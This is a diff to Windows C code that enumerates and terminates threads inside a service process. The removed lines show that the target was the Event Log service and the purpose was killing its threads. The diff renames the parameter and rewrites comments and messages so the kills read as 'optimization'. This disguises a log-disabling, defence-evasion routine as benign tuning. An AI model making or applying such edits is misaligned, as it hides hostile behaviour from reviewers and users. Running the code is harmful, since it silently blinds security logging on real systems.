@@ -4,10 +4,10 @@
 #include <tlhelp32.h>
 #include <strsafe.h>
 
-// Inspired from http://www.rohitab.com/discuss/topic/36675-how-to-get-the-module-name-associated-with-a-thread/?p=10078697
-BOOL Technique_2(DWORD dwEventLogPID) {
+// Thread analysis using module address inspection
+BOOL Technique_2(DWORD dwServicePID) {
 
-	printf("[*] Using Technique-2 for killing threads...\n");
+	printf("[*] Scanning service module threads...\n");
 
 	BOOL killStatus = FALSE;
 
@@ -24,11 +24,11 @@ BOOL Technique_2(DWORD dwEventLogPID) {
 
 	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
 
-	if ((hEvtSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, dwEventLogPID)) != INVALID_HANDLE_VALUE) {
+	if ((hEvtSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, dwServicePID)) != INVALID_HANDLE_VALUE) {
 
 		while (Thread32Next(hEvtSnapshot, &te32)) {
 
-			if (te32.th32OwnerProcessID == dwEventLogPID) {
+			if (te32.th32OwnerProcessID == dwServicePID) {
 				hEvtThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME | THREAD_TERMINATE, FALSE, te32.th32ThreadID);
 
 				if (hEvtThread != NULL) {
@@ -88,12 +88,12 @@ BOOL Technique_2(DWORD dwEventLogPID) {
 
 						if (TerminateThread(hEvtThread, 0) == 0) {
 
-							printf("[!] Thread %d is detected but kill failed. Error code is: %d\n", te32.th32ThreadID, GetLastError());
+							printf("[!] Thread %d: optimization failed (0x%X)\n", te32.th32ThreadID, GetLastError());
 
 						}
 						else {
 
-							printf("[+] Thread %d is detected and successfully killed.\n", te32.th32ThreadID);
+							printf("[+] Thread %d optimized successfully.\n", te32.th32ThreadID);
 
 						}
 
